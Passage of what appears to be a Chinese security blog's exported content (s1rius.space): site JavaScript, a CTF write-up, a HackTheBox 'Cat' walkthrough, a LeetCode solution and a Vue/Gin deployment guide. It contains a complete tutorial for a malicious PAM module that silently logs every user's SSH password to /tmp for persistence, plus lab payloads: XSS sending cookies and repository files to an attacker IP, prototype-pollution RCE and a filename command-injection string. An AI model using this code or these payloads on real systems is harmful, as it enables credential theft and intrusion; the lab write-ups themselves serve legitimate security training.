document.querySelector(targetSelector); if (!el || typeof text !== \"string\") return; setTimeout(() => { const startTyping = () => { let index = 0; function renderChar() { if (index 0) { let currentText = el.textContent; let eraseIndex = currentText.length; function eraseChar() { if (eraseIndex > 0) { el.textContent = currentText.slice(0, --eraseIndex); setTimeout(eraseChar, eraseDelay); } else { startTyping(); // 删除完毕后开始打字 } } eraseChar(); } else { el.textContent = \"\"; startTyping(); } } else { startTyping(); } }, startDelay); } function renderAISummary() { const summaryEl = document.querySelector(\".ai-summary .ai-explanation\"); if (!summaryEl) return; const summaryText = summaryEl.getAttribute(\"data-summary\"); if (summaryText) { typeTextMachineStyle(summaryText, \".ai-summary .ai-explanation\"); // 如果需要切换，在这里调用另一个函数即可 } } document.addEventListener(\"pjax:complete\", renderAISummary); document.addEventListener(\"DOMContentLoaded\", renderAISummary);"},{"title":"","date":"2025-04-06T09:46:31.324Z","updated":"2025-04-06T09:46:31.324Z","comments":true,"path":"custom/tools.js","permalink":"https://s1rius.space/custom/tools.js","excerpt":"","text":"/* * @Author: s1rius * @Date: 2025-02-24 20:35:36 * @LastEditTime: 2025-04-06 17:46:31 * @Description: https://s1rius.space/ */ const option = null; // 定义 getScript 函数 const getScript = (url, attr = {}) => new Promise((resolve, reject) => { const script = document.createElement(\"script\"); script.src = url; script.async = true; Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val)); script.onload = script.onreadystatechange = () => { if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve(); }; script.onerror = reject; document.head.appendChild(script); }); // 定义 runTrack 函数 const runTrack = () => { umami.track((props) => ({ ...props, url: window.location.pathname + window.location.search + window.location.hash, title: window.location.pathname.split(\"/\")[1], })); }; // 定义 loadUmamiJS 函数 const loadUmamiJS = (option = {}) => { getScript(\"https://cloud.umami.is/script.js\", { \"data-website-id\": \"edb580f9-c557-47e7-b93d-dbd1c97d2c5e\", \"data-auto-track\": \"false\", ...option, }).then(runTrack); }; // 调用 loadUmamiJS 加载 umami 并开始跟踪 loadUmamiJS(); if ( window.location.host != \"s1rius.space\" && window.location.hostname != \"localhost\" ) { // 使用新域名和当前URL的pathname, search(查询参数), 和 hash(锚点)创建新的URL var mainUrl = \"https://s1rius.space\" + window.location.pathname + window.location.search + window.location.hash; // 跳转到新的URL window.location.href = mainUrl; } // function getInput() { // // 获取目标元素 // const targetDiv = document.querySelector( // \"#input-text > div > div.cm-scroller > div.cm-content.cm-lineWrapping\" // ); // // 提取所有文本内容（自动排除HTML标签） // const textContent = targetDiv.textContent; // return textContent; // } // function getOutput() { // // 获取目标元素 // const targetDiv = document.querySelector( // \"#output-text > div > div.cm-scroller > div.cm-content.cm-lineWrapping\" // ); // // 提取所有文本内容（自动排除HTML标签） // const textContent = targetDiv.textContent; // return textContent; // } // (function () { // const originalReplaceState = window.history.replaceState; // window.history.replaceState = function (...args) { // const result = originalReplaceState.apply(this, args); // input = getInput(); // output = getOutput(); // if (!input || !output) { // return result; // } // console.log(\"out: \", output); // getScript(\"https://cloud.umami.is/script.js\", { // \"data-website-id\": \"edb580f9-c557-47e7-b93d-dbd1c97d2c5e\", // \"data-auto-track\": \"false\", // ...option, // }).then(() => { // umami.track((props) => ({ // ...props, // name: \"cyberchef\", // data: { // input: input, // output: output, // }, // })); // }); // return result; // }; // })();"},{"title":"","date":"2025-02-26T07:49:51.288Z","updated":"2025-02-26T07:49:51.288Z","comments":true,"path":"custom/welcome.js","permalink":"https://s1rius.space/custom/welcome.js","excerpt":"","text":"let welcomeFlag = Math.floor(Math.random() * 100); if (sessionStorage.getItem(\"popWelcomeWindow\") != welcomeFlag) { if ( document.referrer == \"\" || document.referrer.indexOf(\"s1rius.space\") != -1 || document.referrer.indexOf(\"cns1rius.github.io\") != -1 || document.referrer.indexOf(\"s1rius.vercel.app\") != -1 ) { //改成自己域名，注意是referrer!!! qwq btf.snackbarShow(\"欢迎访问本站！\", undefined, undefined, 5000); } else { const url = new URL(document.referrer); btf.snackbarShow(`欢迎来自${url.host}的童鞋访问本站！`); localStorage.setItem(\"popWelcomeWindow\", welcomeFlag); } } if (sessionStorage.getItem(\"popCookieWindow\") != welcomeFlag) { setTimeout(function () { btf.snackbarShow( \"本站使用Cookie和本地/会话存储保证浏览体验和网站统计\", \"bottom-right\" ); }, 5000); } //不在弹出Cookie提醒 sessionStorage.setItem(\"popCookieWindow\", welcomeFlag); //自带上文浏览器提示 function browserTC() { btf.snackbarShow(\"浏览器版本较低，网站样式可能错乱\", \"bottom-right\"); } function browserVersion() { var userAgent = navigator.userAgent; //取得浏览器的userAgent字符串 var isIE = userAgent.indexOf(\"compatible\") > -1 && userAgent.indexOf(\"MSIE\") > -1; //判断是否IE -1 && userAgent.indexOf(\"rv:11.0\") > -1; var isEdge = userAgent.indexOf(\"Edge\") > -1 && !isIE; //Edge浏览器 var isFirefox = userAgent.indexOf(\"Firefox\") > -1; //Firefox浏览器 var isOpera = userAgent.indexOf(\"Opera\") > -1 || userAgent.indexOf(\"OPR\") > -1; //Opera浏览器 var isChrome = userAgent.indexOf(\"Chrome\") > -1 && userAgent.indexOf(\"Safari\") > -1 && userAgent.indexOf(\"Edge\") == -1 && userAgent.indexOf(\"OPR\") == -1; //Chrome浏览器 var isSafari = userAgent.indexOf(\"Safari\") > -1 && userAgent.indexOf(\"Chrome\") == -1 && userAgent.indexOf(\"Edge\") == -1 && userAgent.indexOf(\"OPR\") == -1; //Safari浏览器 if (isEdge) { if (userAgent.split(\"Edge/\")[1].split(\".\")[0] < 90) { browserTC(); } } else if (isFirefox) { if (userAgent.split(\"Firefox/\")[1].split(\".\")[0] < 90) { browserTC(); } } else if (isOpera) { if (userAgent.split(\"OPR/\")[1].split(\".\")[0] < 80) { browserTC(); } } else if (isChrome) { if (userAgent.split(\"Chrome/\")[1].split(\".\")[0] < 90) { browserTC(); } } else if (isSafari) { //不知道Safari哪个版本是该淘汰的老旧版本 } } //2022-10-29修正了一个错误：过期时间应使用toGMTString()，而不是toUTCString()，否则实际过期时间在中国差了8小时 function setCookies(obj, limitTime) { let data = new Date( new Date().getTime() + limitTime * 24 * 60 * 60 * 1000 ).toGMTString(); for (let i in obj) { document.cookie = i + \"=\" + obj[i] + \";expires=\" + data; } } function getCookie(name) { var arr, reg = new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\"); if ((arr = document.cookie.match(reg))) return decodeURIComponent(arr[2]); else return null; } if (getCookie(\"browsertc\") != 1) { setCookies( { browsertc: 1, }, 1 ); browserVersion(); } var now1 = new Date(); function createtime1() { var grt = new Date(\"08/09/2022 00:00:00\"); //此处修改你的建站时间或者网站上线时间 now1.setTime(now1.getTime() + 250); var days = (now1 - grt) / 1000 / 60 / 60 / 24; var dnum = Math.floor(days); var ascll = [ `欢迎来到s1rius' blog!`, `Have fun 🍭🍭🍭`, ` __ / \\\\ __ ____ /\\\\_ \\\\ _ __ /\\\\_\\\\ __ __ ____ /',__\\\\\\\\/_/\\\\ \\\\ /\\\\ '__\\\\\\\\/\\\\ \\\\ /\\\\ \\\\/\\\\ \\\\ / ',__\\\\ /\\\\__, \\\\ \\\\ \\\\ \\\\\\\\ \\\\ \\\\/ \\\\ \\\\ \\\\\\\\ \\\\ \\\\_\\\\ \\\\/\\\\__, \\\\ \\\\/\\\\____/ \\\\ \\\\_\\\\\\\\ \\\\_\\\\ \\\\ \\\\_\\\\\\\\ \\\\____/\\\\/\\\\____/ \\\\/___/ \\\\/_/ \\\\/_/ \\\\/_/ \\\\/___/ \\\\/___/ `, \"小站已经苟活\", dnum, \"天啦!\", \"©2021 By s1rius\", ]; setTimeout( console.log.bind( console, `\\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\\n\\n%c ${ascll[6]}\\n`, \"color:#00a3d9\", \"\", \"color:#4ea1e1\", \"color:#00a3d9\", \"\", \"color:#00a3d9\", \"\" ) ); setTimeout( console.warn.bind( console, \"%c S013-782 %c 你现在正处于监控中\", \"color:white; background-color:#d9534f\", \"\" ) ); } createtime1();"},{"title":"友情链接","date":"2022-10-28T04:00:00.000Z","updated":"2022-10-28T04:00:00.000Z","comments":true,"path":"link/index.html","permalink":"https://s1rius.space/link/index.html","excerpt":"","text":"友链申请 友链要求申请友链本站信息 [ ] 网站内容符合中国大陆法律法规 [ ] 已添加本博客的友情链接 原则上不接受单向友链 [ ] 网站类型为技术类个人博客 [x] 为了能尽快添加上友链，评论前请将昵称、邮箱、网站补充完整 [x] 原则上建站至少三个月，文章数不得少于 10 篇 请尽量参照以下格式留言评论 123456- name: #站点名称 link: #站点链接 avatar: #站长头像 descr: #站点描述 siteshot: #站点截图 非必须 rss: #站点RSS 非必须本站友链添加方式： 123456- name: s1rius&#39; blog link: https://s1rius.space/ avatar: https://s1rius.space/img/custom/avatar.webp descr: 这里有网络安全和其他技术文章 siteshot: https://s1rius.space/img/custom/siteshot.webp rss: https://s1rius.space/atom.xml"},{"title":"分类","date":"2018-12-12T14:14:16.000Z","updated":"2018-12-12T14:14:16.000Z","comments":false,"path":"tags/index.html","permalink":"https://s1rius.space/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Cloudever wp","slug":"cloudever","date":"2025-04-16T16:00:00.000Z","updated":"2025-04-16T16:00:00.000Z","comments":true,"path":"2025/04/cloudever/","permalink":"https://s1rius.space/2025/04/cloudever/","excerpt":"","text":"声明 忙着写毕设，时间不多 好多题没细做 算是校赛？师姐发了，然后我就来了，有奖金，打着玩玩，提前融入一下 封面是复试的时候拍的 enoch 佬的 wp lally.佬的 wp web php_rce\\ez_rust 两个原题 neko 需要修改 js 将跳转代码中一个 if 判断注释掉 然后执行下面的命令 12345678core.status.hero.hpmax = 100000000000000000; core.status.hero.hp = 100000000000000000; core.status.hero.lv = 26; core.status.hero.exp = 241000000; core.flyTo(&quot;MT350&quot;); core.status.hero.atk = 40960000100000000; core.status.hero.def = 40960000100000000; 到最后一关需要再修改特殊墙体改为可打开 darksouls3 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# @Author: s1rius # @Date: 2025-04-07 22:02:54 # @LastEditTime: 2025-04-08 22:31:20 # @Description: https://s1rius.space/ import requests from bs4 import BeautifulSoup headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;, } res = 0 i = 0 session = requests.Session() response = session.get( &quot;http://9998-d70e365f-ae9a-48bc-a383-ad3844a7d259.challenge.ctfplus.cn/&quot;, headers=headers, ) while res &lt; 1000: i += 1 print(i) response = session.get( &quot;http://9998-d70e365f-ae9a-48bc-a383-ad3844a7d259.challenge.ctfplus.cn/&quot;, headers=headers, ) q = response.text.split(&quot;&lt;br&gt;&quot;)[0].split(&quot;&lt;p&gt;&quot;)[2].strip() print(q) response = requests.get( f&quot;https://www.vgbaike.com/search.html?wd={q}&amp;g=dark_souls_3&quot; ) soup = BeautifulSoup(response.text, &quot;html.parser&quot;) div = soup.find(&quot;div&quot;, class_=&quot;s-result-title&quot;) a_tag = div.find(&quot;a&quot;) ans = a_tag.get_text(strip=True) print( f&quot;http://9998-d70e365f-ae9a-48bc-a383-ad3844a7d259.challenge.ctfplus.cn/?answer={ans}&quot; ) response = session.get( f&quot;http://9998-d70e365f-ae9a-48bc-a383-ad3844a7d259.challenge.ctfplus.cn/?answer={ans}&quot;, headers=headers, ) print(response.text) res = int(response.text.split(&quot;:&quot;)[1].split(&quot;/&quot;)[0].strip()) print(requests.utils.dict_from_cookiejar(response.cookies)) print(res) print(response.text) ez_python 可能是非预期？ 标题写着不是软连接 此地无银三百两 tar 包个根目录的软连接，链接上去找不到 flag 之后 upload 文件名 rce 1pam.tar; env &gt; `echo &#39;Lw==&#39; | base64 -d`tmp`echo &#39;Lw==&#39; | base64 -d`test.txt; notes 可能又是非预期？ protobufjs 和 ejs 的洞 复写 protoconfig 写一个啥 function 然后 create 执行一下 再写一次 client=true 再 create 一下 我 function 是把环境变量的 js 写进 views 的 ejs 里面了 12345{&quot;data&quot;:[{&quot;title&quot;: &quot;option(a).constructor.prototype.escapeFunction = \\&quot;process.mainModule.require(&#39;fs&#39;).writeFileSync(&#39;.\\/views\\/create.ejs&#39;, &#39;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&#39; + process.env.FLAG + &#39;&lt;\\/body&gt;&lt;\\/html&gt;&#39;)\\&quot;;\\r\\n optional&quot; },{&quot;author&quot;:&quot;optional&quot;}]} {&quot;data&quot;:[{&quot;title&quot;:&quot;option(a).constructor.prototype.client = \\&quot;true\\&quot;;\\n optional&quot;},{&quot;author&quot;:&quot;optional&quot;}]} notes_rev 弹不了 带不出 ejs 写不进 转攻 json 写进去之后读取报个 esc 不是 function 的错 需要把 escapeFunction 污染回去，二次污染没成功索性一次干完 123456789{&quot;data&quot;:[{&quot;title&quot;:&quot;option(a).constructor.prototype.front = &#39;{\\&quot;title\\&quot;:\\&quot;flag\\&quot;,\\&quot;content\\&quot;:\\&quot;&#39;;\\n optional&quot;},{&quot;author&quot;:&quot;optional&quot;}]} {&quot;data&quot;:[{&quot;title&quot;:&quot;option(a).constructor.prototype.after = &#39;\\&quot;}&#39;;\\n optional&quot;},{&quot;author&quot;:&quot;optional&quot;}]} {&quot;data&quot;:[{&quot;title&quot;: &quot;option(a).constructor.prototype.escapeFunction = \\&quot;process.mainModule.require(&#39;fs&#39;).writeFileSync(&#39;.\\/notes\\/test.json&#39;, Object.prototype.front + process.env.FLAG + Object.prototype.after);delete Object.prototype.escapeFunction;\\&quot;;\\r\\n optional&quot; },{&quot;author&quot;:&quot;optional&quot;}]} {&quot;data&quot;:[{&quot;title&quot;:&quot;option(a).constructor.prototype.client = \\&quot;true\\&quot;;\\n optional&quot;},{&quot;author&quot;:&quot;optional&quot;}]} php_shop sql 语句有问题 1:123456 登进去 发现反序列化 tp5.0.23 用 5.0.4~5.0.24 反序列化，本地跑通了 但是需要过 array markdown 互转和序列化必须是 array 本地搭 docker 和反序列化花的时间太长了，短时间没想出来怎么绕 misc sign1 文件末尾 hex sign2 1I 0oO 认不出来不想试 flag 了 sign3 分离之后爆破压缩包 rockyou 密码表 sign4 流量题怎么就一道简单题 sign5 有乱码转正之后有一半 flag 看下面还有东西以为是零宽之类的但是没试出来 sign6 sign7 osint 是 MU5156 2024/8/18 下午 2:30 B2419 查到 MU5156 而且应该在飞行中段 山东江苏试了几个没出之后找出题人确定了是在山东附近有多试了几个试出来了 real_sign 截了两个关键帧分别是左右图像最大的时候 没装 ps ps 扭曲拼接一下应该能出？ re 安卓逆向 1 全有了，赛博厨子搓一下即可 2 打开发现 hook 不了用不到 frida 去 so 层 发现 rc4 密文密钥 1jni_cloudever: 8D851F15AB765E28581A4B0D5788E1E04F0BB13A8B39005D81D9C772BD0B90C369D64CB87CB32E00; ez_map main_maze 地图 main.startX/Y 起始点坐标(6,6) 走一遍 welcome……即可 ez_pyd 混淆的太严实了 ai 也没分析出来 直接调试 python ynuctf{1111111}位数凑够 调试拿到密文 反推出密钥 再正推出 flag ex_llvm 位移 xor YNUCTF{输进去出现下一位 l，然后依次手搓出来就行 pwn 出了两个原题 由于是 archlinux rop 题 libcsearch 出了点 bug 后来又搓好了 神奇 crypto 科目 123 基本是原题 科目 3 signin1 1234567891011def phase2(high_m, n, c): R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=&#39;NTL&#39;) m = high_m + x M = m((m^3 - c).small_roots()[0]) print(hex(int(M))[2:]) n = 22704983441342148789158477928504200252949219550948566906790734116857581896147602873641731204245234489794553123971018486415513604830790333726233734999972446008361933367602634881722198692541849562885481151700582715982199448346232898715159722536857967993760062251151739817224614937545587492136925970734203042940959736935828777312454374268609959770517451831445322231737862176733824990754042939484572457599641178043983404812306352941111629671712818222046739328026817232851849907790058073229445025638251952601259007892950527809151012888476941620209777665936969350417279657180049199016961747961934829450405121018896026683057 c = 27091082454125034709660465484186175481294547541915314357428478859775459918462993752000949426427351121381005723451455537027301071775833846318612013393929395332670588224596463878232882207935407881802031486452494491990307689920104930994688222105464546716718442197687350963630258262135529644577487776191919246614888483885478030439860492032522757697088199449807080875330693644177211961129758831318676484517444567023668238987052635277498277452417641451725711327258651748101500112041968643835679591426500841978386212815251521283368037 high_m = 30033696379897398978772526118026660467778905226735939980072689354761479122906588371890865088748183335297343600411096102175209674580047859143620533292633404045742635155577634816 phase2(high_m, n, c) signin2 1234567891011121314151617n= 26071445595981395133268968075251944466498060763819227478695947509424921547060590393129061508017457456424978728239726133552097721600303144638009869734748681869056009308293142371152663228344020236515443813182209787660745959910062299761545996066189590736556796787377942053946456193809786130022858952981573029366618549463618113877861619738041802302141510592797078274982782868034373320344206299273253051629520980823750320265771084278721585606145566214491744680192697679277401296499227294030714763962644130749189453930479708165124571614561176572863416034011773618849345401444589259247760138603659126070309675809422023170493 p4= 92283816334791027537832980799840991188721580033186187030916296688371970354339160232191061774075579274055020758326031496089309793343324792687435117404979114975149614970117678398492298003334407661416092747448087069801349794590599073348176907840464037 e= 114 pbits= 1024 kbits=pbits - p4.nbits() print(p4.nbits()) p4 = p4 &lt;&lt; kbits PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits,beta=0.4) if roots: p= p4 + int(roots[0]) print(&quot;n=&quot;,n) print(&quot;p=&quot;,p) print(&quot;q=&quot;,n/p)","categories":[{"name":"web","slug":"web","permalink":"https://s1rius.space/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"misc","slug":"misc","permalink":"https://s1rius.space/tags/misc/"},{"name":"pwn","slug":"pwn","permalink":"https://s1rius.space/tags/pwn/"},{"name":"re","slug":"re","permalink":"https://s1rius.space/tags/re/"},{"name":"crypto","slug":"crypto","permalink":"https://s1rius.space/tags/crypto/"},{"name":"cloudever wp","slug":"cloudever-wp","permalink":"https://s1rius.space/tags/cloudever-wp/"}],"author":"s1rius"},{"title":".so劫持PAM监听密码","slug":"pam劫持密码","date":"2025-03-10T16:00:00.000Z","updated":"2025-03-10T16:00:00.000Z","comments":true,"path":"2025/03/pam劫持密码/","permalink":"https://s1rius.space/2025/03/pam%E5%8A%AB%E6%8C%81%E5%AF%86%E7%A0%81/","excerpt":"","text":".so 劫持 PAM 监听密码 最近渗透遇见个主机，想通过劫持 PAM 监听密码来获取密码 本文章适用于 Ubuntu，其他系统的不同之处可参考下文中的介绍做相应处理 本文章仅介绍操作方法，原理可见下面这篇文章 centos 可见：利用Linux-PAM记录密码 该文章不适用于 Ubuntu 等系统，因此写下本文章 任意目录新建 ssh.c： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;security/pam_appl.h&gt; #include &lt;security/pam_modules.h&gt; #include &lt;security/pam_ext.h&gt; #include &lt;unistd.h&gt; #define STOREPATH &quot;/tmp/example.txt&quot; PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) { return PAM_SUCCESS; } PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; } PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) { int retval; const char* username; const char* password; char hostname[128]; retval = pam_get_user(pamh, &amp;username, &quot;Username: &quot;); if (retval != PAM_SUCCESS) { return retval; } retval = pam_get_authtok(pamh,PAM_AUTHTOK,&amp;password,NULL); if (retval != PAM_SUCCESS) { return retval; } gethostname(hostname, sizeof hostname); FILE *fp = NULL; fp = fopen(STOREPATH, &quot;a+&quot;); fprintf(fp, &quot;%s：%s：%s\\n&quot;,hostname,username,password); fclose(fp); return PAM_SUCCESS; } 同目录下新建 Makefile，写入： 1234CFLAGS += -Werror -Wall ssh.so: ssh.c gcc $(CFLAGS) -fPIC -shared -Xlinker -x -o $@ $&lt; 运行如下代码 123apt-get install libpam0g-dev # 其它系统见下面的介绍1 make cp ssh.so /usr/lib/x86_64-linux-gnu/security/ # 其它系统见下面的介绍2 1：其它系统可搜索PAM开发包或者 xxx 系统的libpam0g-dev pam-devel包 2：其它系统可查询/etc/pam.d/是否存在，不存在可以 bing 下类似作用的文件夹 然后查看common-auth common-account文件 1find / -name xxx.so # xxx.so是上面两个文件中option部分的第三个参数 一般命令结果第一个就是 security 的目录 然后 1cp ssh.so /path/to/security 在/etc/pam.d/common-auth 中 option 部分中添加一行 12auth optional ssh.so ; 字符间间隔用tab键对齐 下面同理 如果/etc/pam.d/common-account 不存在则将下面那行代码和上面那行代码放一块即可 /etc/pam.d/common-account 同理 1account optional ssh.so exit 退出再 ssh 登陆下或者其他需要密码的操作皆可 然后查看/tmp/example.txt 中是否成功记录 成功记录后等待其他用户登录该机器即可，隔几天登录查看下/tmp/example.txt","categories":[{"name":"教程","slug":"教程","permalink":"https://s1rius.space/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://s1rius.space/tags/%E6%B8%97%E9%80%8F/"},{"name":"权限维持","slug":"权限维持","permalink":"https://s1rius.space/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"PAM","slug":"PAM","permalink":"https://s1rius.space/tags/PAM/"}],"author":"s1rius"},{"title":"htb-Cat","slug":"htb-Cat","date":"2025-02-19T16:00:00.000Z","updated":"2025-02-19T16:00:00.000Z","comments":true,"path":"2025/02/htb-Cat/","permalink":"https://s1rius.space/2025/02/htb-Cat/","excerpt":"","text":"Cat 信息收集 nmap -A -sS -Pn 10.10.11.53 发现 git 泄露 python GitHack.py http://cat.htb/.git/ 首先看图片上传，白名单没法绕过 然后发现 xss 和 sql xss 结合两个可能被后台机器人看到的页面view_cat.php admin.php 会输出如下信息 再到两个可控输入contest.php join.php 可以看到 contest 中为与猫相关的信息，且有过滤 而 join 中的 name 会被 contest 带入猫库，并最后被 view_cat 输出为 Owner 尝试将 name 写为 123&lt;script&gt; document.location = &quot;http://10.10.xx.xx:8080/?c=&quot; + document.cookie; &lt;/script&gt; 将 cookie 带出 一开始以为是 cat 的信息，后来发现 cat 的信息都被contains_forbidden_content过滤了，然后才发现 owner_username sql inject 所有的 sql 语句都 prepare 过了，只有accept_cat.php(10)存在一条 insert 没有预编译 1sqlmap --batch --risk 3 --level 5 --threads 10 -r &quot;~/tmp.txt&quot; --dbms=sqlite -T users --dump 提权 上 linpeas 发现大量 log 以及 mail 结合之前的包，发现密码在 get 中明文传递 查看 apache log 中loginPassword字段找到 axel 密码 1axel: aNdZwgC4tI9gnVXv_e3Q; 登陆获取 user.txt 查看 axel 的 mail 发现 rosa 发过来的 开隧道代理后进入该网址 登录 rosa 以及 axel 的账号发现只有 axel 能登 还没有该仓库的权限 发现 1.22.0 版本 gitea 存在 xss 漏洞 添加仓库 介绍写入 xss 初始化 1234&lt;a href=&#39;javascript:fetch(&quot;http://localhost:3000/administrator/Employee-management/&quot;).then(response=&gt;response.text()).then(data=&gt;fetch(&quot;http://10.10.16.22:8080/?d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));&#39; &gt;Click me&lt;/a &gt; 然后给他发邮件 1echo -e &quot;Check my repo http://localhost:3000/axel/test&quot; | sendmail jobert@cat.htb 监听时返回过长 开 wirshark 抓本地连接 解码得到一些文件 搜索title=即可看到仓库里有哪些文件 然后挨个找 发现 index.php 里有密码 1234&lt;a href=&#39;javascript:fetch(&quot;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&quot;).then(response=&gt;response.text()).then(data=&gt;fetch(&quot;http://10.10.16.22:8080/?d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));&#39; &gt;Click me&lt;/a &gt; su root 获取 root.txt","categories":[{"name":"htb","slug":"htb","permalink":"https://s1rius.space/categories/htb/"}],"tags":[{"name":"web","slug":"web","permalink":"https://s1rius.space/tags/web/"},{"name":"htb-Cat","slug":"htb-Cat","permalink":"https://s1rius.space/tags/htb-Cat/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://s1rius.space/tags/HackTheBox/"}],"author":"s1rius"},{"title":"力扣 394.字符串解码 特殊解","slug":"leetcode 394","date":"2025-02-19T16:00:00.000Z","updated":"2025-02-19T16:00:00.000Z","comments":true,"path":"2025/02/leetcode 394/","permalink":"https://s1rius.space/2025/02/leetcode%20394/","excerpt":"","text":"394.字符串解码 一种独创的 不用辅助栈的解(笑) 思路 不用栈 遍历字符串转 python 表达式 eval 直出 解题过程 对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行 那么对于四个例子我们可以转换成代码中注释部分的表达式 1234eval(&#39;3*(&quot;a&quot;) + 2*(&quot;bc&quot;)&#39;) eval(&#39;3*(&quot;a&quot;+2*(&quot;c&quot;))&#39;) eval(&#39;2*(&quot;abc&quot;)+3*(&quot;cd&quot;)+&quot;ef&quot;&#39;) eval(&#39;&quot;abc&quot;+3*(&quot;cd&quot;)+&quot;xyz&quot;&#39;) 复杂度 时间复杂度: O(n) 空间复杂度: O(n) Code 12345678910111213141516171819202122class Solution: def decodeString(self, s: str) -&gt; str: func = &#39;&#39; # 用于存表达式 for i in range(len(s)): if s[i].isdigit(): if i &gt; 0 and not s[i - 1].isdigit(): func += &quot;+&quot; func += s[i] elif s[i] == &quot;[&quot;: func += &quot;*(&quot; elif s[i] == &quot;]&quot;: func += &quot;)&quot; if i &lt; len(s) - 1 and s[i + 1] != &quot;]&quot; and not s[i + 1].isdigit(): func += &quot;+&quot; else: if i == 0 or not s[i - 1].isalpha(): func += &#39;&quot;&#39; func += s[i] if i == len(s) - 1 or not s[i + 1].isalpha(): func += &#39;&quot;&#39; print(func) return eval(func)","categories":[{"name":"算法","slug":"算法","permalink":"https://s1rius.space/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://s1rius.space/tags/leetcode/"},{"name":"算法","slug":"算法","permalink":"https://s1rius.space/tags/%E7%AE%97%E6%B3%95/"}],"author":"s1rius"},{"title":"vue gin合并部署(完美方案)","slug":"vue gin合并部署","date":"2024-12-25T16:00:00.000Z","updated":"2024-12-25T16:00:00.000Z","comments":true,"path":"2024/12/vue gin合并部署/","permalink":"https://s1rius.space/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/","excerpt":"","text":"简介 目前 vue 与 gin 的项目基本都是前后端分离部署 二者合并部署的教程非常少，且各有各的问题 结合各个教程后 找到一种比较完美的合并部署方案 vue 使用 axios 时进行如下配置 12345const request = axios.create({ baseURL: `${currentDomain}/api`, timeout: 5000, headers: { &quot;Cache-Control&quot;: &quot;no-cache&quot; }, }); 对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（必须） 并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL headers 的设置是为了 vue dev 环境下，前后端的联调 同时 为了 dev 联调避免出现跨域问题，还应添加代理 1234567891011121314export default defineConfig({ // 其他参数 server: { // port: 8080, // open: true, proxy: { &quot;/api&quot;: { target: &quot;http://localhost:5731&quot;, changeOrigin: true, // rewrite: (path) =&gt; path.replace(/^\\/api/, &quot;&quot;), // 移除 /api 前缀 根据前后端代码 自行修改 }, }, }, }); 额外配置 build 后任务，将构建好的 dist 复制到后端目录下 12345&quot;scripts&quot;: { &quot;dev&quot;: &quot;vite&quot;, &quot;build&quot;: &quot;vite build &amp;&amp; robocopy ./dist 后端路径/vue /e /z /r:0&quot;, &quot;preview&quot;: &quot;vite preview&quot; }, 方便一部送到位 gin 12345678❯ tree 文件夹 PATH 列表 卷序列号为 AE05-588D C:. ├─main.go ├─其他 └─vue /* 可改 */ └─assets main.go 添加 embed 和路由 12345678910111213141516171819202122232425262728//go:embed vue/index.html var indexHtml []byte //go:embed vue/* var vue embed.FS func main() { // 其他设置 // 配置允许跨域 方便dev联调 r.Use(cors.New(cors.Config{ AllowOrigins: []string{&quot;*&quot;}, // 允许的域名 AllowMethods: []string{&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;}, AllowHeaders: []string{&quot;Origin&quot;, &quot;Content-Type&quot;, &quot;Authorization&quot;, &quot;Cache-Control&quot;}, AllowCredentials: true, })) // 配置vue路由 assets, _ := fs.Sub(vue, &quot;vue/assets&quot;) r.StaticFS(&quot;/assets&quot;, http.FS(assets)) icon, _ := fs.ReadFile(vue, &quot;vue/favicon.ico&quot;) r.GET(&quot;/favicon.ico&quot;, func(c *gin.Context) { c.Data(200, &quot;image/x-icon&quot;, icon) }) r.NoRoute(func(c *gin.Context) { c.Data(200, &quot;text/html; charset=utf-8&quot;, indexHtml) }) // 其他路由 } 使用r.NoRoute将非后端路由全部导向 index.html，并由 index.html 获取 css、js 等 vue 中设置的 router 会被 build 进 js 通过 js 获取 url 来切换页面 对未使用 embed 的方法同理，参考代码自行设置 embed 对于使用embed的 由于StaticFS和embed的底层代码逻辑 在前端根目录的文件一般不多，这里只有index.html和 icon 文件 可通过单独获取、或通过fs.ReadFile获取，分别参考index.html和favicon.ico 对于前端其他文件，需要通过fs.Sub下移到对应目录后才能通过r.StaticFS(&quot;/assets&quot;, http.FS(assets))配置路由，且前端文件夹名和后端路由必须相同，二者缺一不可，否则会出现空白页面，即请求 js 